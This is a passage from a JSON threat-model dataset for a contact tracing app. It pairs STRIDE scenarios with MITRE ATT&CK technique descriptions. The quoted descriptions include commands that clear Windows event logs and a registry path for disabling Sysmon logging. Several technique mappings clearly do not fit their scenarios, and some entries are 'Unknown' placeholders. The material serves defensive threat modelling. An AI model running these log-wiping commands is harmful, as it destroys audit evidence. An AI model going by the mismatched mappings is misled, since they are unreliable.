            "Scenario": "An attacker modifies the contact tracing application source code on a user device to change its behavior.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or remote access to the user's device",
                    "Role": "Attacker",
                    "Condition": "Device is compromised or unattended."
                },
                {
                    "Assumption": "The application lacks code integrity checks",
                    "Role": "System Designer",
                    "Condition": "No mechanisms to ensure code hasn't been altered."
                },
                {
                    "Assumption": "Users have not enabled security features on their devices",
                    "Role": "User",
                    "Condition": "Lack of user awareness or training."
                }
            ],
            "Potential Impact": "Malicious behavior and unauthorized data transmission.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "source code modification",
                "malware injection",
                "device compromise"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies submitting positive COVID-19 result data to the central server.",
            "Assumptions": [
                {
                    "Assumption": "Data submitted does not have a non-repudiation mechanism",
                    "Role": "System Designer",
                    "Condition": "Lack of digital signatures or logging."
                },
                {
                    "Assumption": "Communication channels are not monitored",
                    "Role": "System Designer",
                    "Condition": "Absence of logging or monitoring systems."
                },
                {
                    "Assumption": "The central server cannot verify the origin of the data",
                    "Role": "System Designer",
                    "Condition": "No origin verification methods implemented."
                }
            ],
            "Potential Impact": "Loss of trust and data integrity issues.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "data origin",
                "non-repudiation",
                "user denial"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user disputes receiving an exposure notification.",
            "Assumptions": [
                {
                    "Assumption": "Record of exposure notifications is not kept",
                    "Role": "System Designer",
                    "Condition": "Lack of audit logging for notifications."
                },
                {
                    "Assumption": "The system does not validate receipt of notifications",
                    "Role": "System Designer",
                    "Condition": "No verification mechanisms for notification delivery."
                },
                {
                    "Assumption": "The application does not keep logs of user interactions",
                    "Role": "System Designer",
                    "Condition": "No user interaction logging systems."
                }
            ],
            "Potential Impact": "Inability to verify system actions, challenges in accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "notification",
                "audit logging",
                "non-receipt"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker could alter the timestamps in log files to dispute their actions.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to modify log files",
                    "Role": "Attacker",
                    "Condition": "Elevated or administrative privileges."
                },
                {
                    "Assumption": "Log files are not write-protected",
                    "Role": "System Designer",
                    "Condition": "No write-protection implemented."
                },
                {
                    "Assumption": "Log file integrity is not monitored",
                    "Role": "System Designer",
                    "Condition": "No integrity verification processes in place."
                }
            ],
            "Potential Impact": "Loss of data integrity, issues with non-repudiation.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log file modification",
                "timestamp alteration",
                "audit manipulation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized third party intercepts unencrypted Bluetooth communication between devices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has a device in proximity to the victim's device",
                    "Role": "Attacker",
                    "Condition": "Within the effective Bluetooth range."
                },
                {
                    "Assumption": "Bluetooth communications are not encrypted",
                    "Role": "System Designer",
                    "Condition": "Lack of robust encryption protocols."
                },
                {
                    "Assumption": "The attacker uses a tool to capture Bluetooth communications",
                    "Role": "Attacker",
                    "Condition": "Availability of Bluetooth sniffing tools."
                }
            ],
            "Potential Impact": "Unauthorized data access and privacy violations.",
            "MITRE ATT&CK Keywords": [
                "eavesdropping",
                "bluetooth",
                "man-in-the-middle",
                "data interception"
            ],
            "mitre_technique": {
                "name": "Exfiltration Over Bluetooth",
                "description": "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
                "id": "attack-pattern--613d08bc-e8f4-4791-80b0-c8b974340dfd",
                "technique_id": "T1011.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker accesses sensitive data stored on the central server.",
            "Assumptions": [
                {
                    "Assumption": "Central server is vulnerable to attacks",
                    "Role": "System Administrator",
                    "Condition": "Unpatched vulnerabilities or misconfigurations."
                },
                {
                    "Assumption": "Sensitive data is not encrypted at rest",
                    "Role": "System Designer",
                    "Condition": "No data encryption methods used."
                },
                {
                    "Assumption": "The attacker has user credentials or can exploit server vulnerabilities",
                    "Role": "Attacker",
                    "Condition": "Access to or knowledge of server credentials."
                }
            ],
            "Potential Impact": "Data exposure, compromise of confidentiality.",
            "MITRE ATT&CK Keywords": [
                "data at rest",
                "sensitive information",
                "server compromise",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Malicious app version leaks the user\u2019s location and interaction data.",
            "Assumptions": [
                {
                    "Assumption": "Users have unknowingly installed a compromised version of the application",
                    "Role": "User",
                    "Condition": "Devices are infected with malware."
                },
                {
                    "Assumption": "The malicious version is able to access sensitive data without detection",
                    "Role": "System Designer",
                    "Condition": "No monitoring of unauthorized app versions."
                },
                {
                    "Assumption": "The attacker has injected malicious code into the application",
                    "Role": "Attacker",
                    "Condition": "Successful code injection or malware spreading."
                }
            ],
            "Potential Impact": "Location tracking and loss of privacy.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "data leakage",
                "location tracking",
                "malicious app"
            ],
            "mitre_technique": {
                "name": "Domain Generation Algorithms",
                "description": "Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)\n\nDGAs can take the form of apparently random or \u201cgibberish\u201d strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)\n\nAdversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)",
                "id": "attack-pattern--118f61a5-eb3e-4fb6-931f-2096647f4ecd",
                "technique_id": "T1568.002"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a DDoS attack on the central server, making it unavailable.",
            "Assumptions": [
                {
                    "Assumption": "The central server is not protected against DDoS attacks",
                    "Role": "System Administrator",
                    "Condition": "Lack of DDoS mitigation measures."
                },
                {
                    "Assumption": "The attacker can orchestrate network traffic to overwhelm the server",
                    "Role": "Attacker",
                    "Condition": "Availability of botnets or DDoS tools."
                },
                {
                    "Assumption": "Server resources are limited and can be exhausted",
                    "Role": "System Administrator",
                    "Condition": "No scalable infrastructure."
                }
            ],
            "Potential Impact": "Service disruption and loss of availability.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "server overload",
                "network traffic",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the app causing it to crash upon launch.",
            "Assumptions": [
                {
                    "Assumption": "The app contains unpatched vulnerabilities",
                    "Role": "System Developers",
                    "Condition": "Known or unknown vulnerabilities."
                },
                {
                    "Assumption": "The attacker has knowledge of this vulnerability",
                    "Role": "Attacker",
                    "Condition": "Information about the vulnerability is available."
                },
                {
                    "Assumption": "Users are required to update manually",
                    "Role": "User",
                    "Condition": "Outdated app versions in use."
                }
            ],
            "Potential Impact": "Application unavailability and user inconvenience.",
            "MITRE ATT&CK Keywords": [
                "vulnerability exploitation",
                "app crash",
                "service disruption",
                "denial of service"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker sends malformed data packets causing the service server to malfunction.",
            "Assumptions": [
                {
                    "Assumption": "Service server does not validate data packets properly",
                    "Role": "System Designer",
                    "Condition": "Absence of data validation mechanisms."
                },
                {
                    "Assumption": "The attacker is able to send data packets to the server",
                    "Role": "Attacker",
                    "Condition": "Network access to the server."
                },
                {
                    "Assumption": "The server software is not designed to handle malformed packets",
                    "Role": "System Developers",
                    "Condition": "Improper exception handling."
                }
            ],
            "Potential Impact": "Service disruption and potential data corruption.",
            "MITRE ATT&CK Keywords": [
                "packet injection",
                "service server",
                "malformed packets",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a software vulnerability to gain admin access on the central server.",
            "Assumptions": [
                {
                    "Assumption": "The central server has unpatched vulnerabilities",
                    "Role": "System Administrator",
                    "Condition": "Unfixed CVEs in server software."
                },
                {
                    "Assumption": "The attacker has knowledge of these vulnerabilities",
                    "Role": "Attacker",
                    "Condition": "Information on exposing vulnerabilities."
                },
                {
                    "Assumption": "Admin access is not properly restricted",
                    "Role": "System Administrator",
                    "Condition": "Insufficient access control."
                }
            ],
            "Potential Impact": "Total data compromise and system control.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "server compromise",
                "admin access",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A malicious user leverages a flaw in the role-based access control to access unauthorized data.",
            "Assumptions": [
                {
                    "Assumption": "Role-based access controls are improperly configured",
                    "Role": "System Designer",
                    "Condition": "Misconfigured access control policies."
                },
                {
                    "Assumption": "The attacker understands the access control system",
                    "Role": "Attacker",
                    "Condition": "Possessing detailed system knowledge."
                },
                {
                    "Assumption": "There is no monitoring of access control abuses",
                    "Role": "System Administrator",
                    "Condition": "Lack of access control monitoring."
                }
            ],
            "Potential Impact": "Unauthorized access and data compromise.",
            "MITRE ATT&CK Keywords": [
                "role-based access control",
                "misconfiguration",
                "privilege escalation",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses social engineering to trick an admin into granting elevated permissions.",
            "Assumptions": [
                {
                    "Assumption": "Administrators are not trained in social engineering awareness",
                    "Role": "System Administrator",
                    "Condition": "Lack of security awareness training."
                },
                {
                    "Assumption": "Processes for granting privileges are not stringent",
                    "Role": "System Designer",
                    "Condition": "Weak approval processes."
                },
                {
                    "Assumption": "Social engineering protections are not in place",
                    "Role": "System Administrator",
                    "Condition": "No verification mechanisms for sensitive actions."
                }
            ],
            "Potential Impact": "Unauthorized access and modification of data.",
            "MITRE ATT&CK Keywords": [
                "social engineering",
                "elevated permissions",
                "privilege escalation",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Artificial Intelligence",
                "description": "Adversaries may obtain access to generative artificial intelligence tools, such as large language models (LLMs), to aid various techniques during targeting. These tools may be used to inform, bolster, and enable a variety of malicious tasks including conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043), creating basic scripts, assisting social engineering, and even developing payloads.(Citation: MSFT-AI)\n\nFor example, by utilizing a publicly available LLM an adversary is essentially outsourcing or automating certain tasks to the tool. Using AI, the adversary may draft and generate content in a variety of written languages to be used in [Phishing](https://attack.mitre.org/techniques/T1566)/[Phishing for Information](https://attack.mitre.org/techniques/T1598) campaigns. The same publicly available tool may further enable vulnerability or other offensive research supporting [Develop Capabilities](https://attack.mitre.org/techniques/T1587). AI tools may also automate technical tasks by generating, refining, or otherwise enhancing (e.g., [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027)) malicious scripts and payloads.(Citation: OpenAI-CTI)\n",
                "id": "attack-pattern--0cc222f5-c3ff-48e6-9f52-3314baf9d37e",
                "technique_id": "T1588.007"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "20",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could create a fake contact tracing app that mimics the legitimate one to steal user credentials or sensitive health data.",
            "Assumptions": [
                {
                    "Assumption": "Users may download apps from untrusted sources.",
                    "Role": "End-user",
                    "Condition": "User does not verify app source."
                },
                {
                    "Assumption": "Attackers have access to tools to develop a similar interface.",
                    "Role": "Attacker",
                    "Condition": "Availability of app development tools."
                },
                {
                    "Assumption": "Users may not be aware of app verification practices.",
                    "Role": "End-user",
                    "Condition": "Lack of user education on app security."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "phishing",
                "credential theft"
            ],
            "mitre_technique": {
                "name": "Malicious File",
                "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
                "id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
                "technique_id": "T1204.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof the device ID to masquerade as a legitimate user, gaining access to the contact tracing system.",
            "Assumptions": [
                {
                    "Assumption": "The system does not have mechanisms to verify device authenticity.",
                    "Role": "System Designer",
                    "Condition": "Lack of device authentication measures."
                },
                {
                    "Assumption": "Attackers have technical knowledge to manipulate device IDs.",
                    "Role": "Attacker",
                    "Condition": "Availability of tools to modify device identifiers."
                },
                {
                    "Assumption": "The underlying communication protocol is susceptible to spoofing.",
                    "Role": "System Architect",
                    "Condition": "Protocol vulnerabilities."
                }
            ],
            "Potential Impact": "Unauthorized access to data and system.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "device ID",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Conditional Access Policies",
                "description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\n\nFor example, in Azure AD, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. \n\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",
                "id": "attack-pattern--ceaeb6d8-95ee-4da2-9d42-dc6aa6ca43ae",
                "technique_id": "T1556.009"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker might intercept and alter the Bluetooth/GPS signals to make it appear users have been in contact with infected individuals.",
            "Assumptions": [
                {
                    "Assumption": "The communication between devices is not encrypted.",
                    "Role": "System Designer",
                    "Condition": "Lack of encryption."
                },
                {
                    "Assumption": "Attackers can access and manipulate Bluetooth/GPS signals.",
                    "Role": "Attacker",
                    "Condition": "Proximity to target devices."
                },
                {
                    "Assumption": "Devices trust incoming signals without verifying their source.",
                    "Role": "System Architect",
                    "Condition": "Lack of signal verification."
                }
            ],
            "Potential Impact": "False exposure notifications, causing unnecessary panic or misinformation.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "signal interception",
                "fake alerts"
            ],
            "mitre_technique": {
                "name": "Phishing",
                "description": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.\n\nAdversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014) Another way to accomplish this is by forging or spoofing(Citation: Proofpoint-spoof) the identity of the sender which can be used to fool both the human recipient as well as automated security tools.(Citation: cyberproof-double-bounce) \n\nVictims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools onto their computer (i.e., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: Unit42 Luna Moth)",
                "id": "attack-pattern--a62a8db3-f23a-4d8f-afd6-9dbc77e7813b",
                "technique_id": "T1566"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could tamper with the mobile application to change recorded data before it is uploaded to the server.",
            "Assumptions": [
                {
                    "Assumption": "Devices are rooted or jailbroken by users.",
                    "Role": "End-user",
                    "Condition": "User device security controls bypassed."
                },
                {
                    "Assumption": "The local app does not enforce data integrity checks.",
                    "Role": "System Designer",
                    "Condition": "Lack of integrity verification."
                },
                {
                    "Assumption": "Attackers have physical or remote access to the device.",
                    "Role": "Attacker",
                    "Condition": "Access to the smartphone."
                }
            ],
            "Potential Impact": "Corruption or tampering of data.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data integrity",
                "rooted device"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: 